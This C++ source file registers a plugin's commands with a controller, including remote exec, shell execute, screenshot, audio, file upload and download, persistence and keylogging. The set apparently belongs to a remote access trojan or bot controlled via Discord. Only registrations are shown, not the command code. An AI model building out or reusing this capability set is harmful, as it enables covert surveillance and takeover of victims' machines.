#include "stdplugin.h"
#include "controller.h"
#include "commands.h"
#include "log.h"

PARSE_ENUM(NavigationCommandEnum);
PARSE_ENUM(AudioCommandEnum);
PARSE_ENUM(DiscordCommandEnum);
PARSE_ENUM(ShowoffCommandEnum);
PARSE_ENUM(KeylogCommandEnum);

void StdPlugin::init(Controller& ctrl) {
    DEBUGLOG("[+] StdPlugin loaded.\n");
    ctrl.register_command<NavigationCommand>();
    ctrl.register_command<DiscordCommand>();
    ctrl.register_command<ExecCommand>();
    ctrl.register_command<ScreenshotCommand>();
    ctrl.register_command<AudioCommand>();
    ctrl.register_command<DownloadFileCommand>();
    ctrl.register_command<UploadFileCommand>();
    ctrl.register_command<PersistCommand>();
    ctrl.register_command<DialogCommand>();
    ctrl.register_command<ShowoffCommand>();
    ctrl.register_command<ShellExecuteCommand>();
    ctrl.register_command<KeylogCommand>();
}
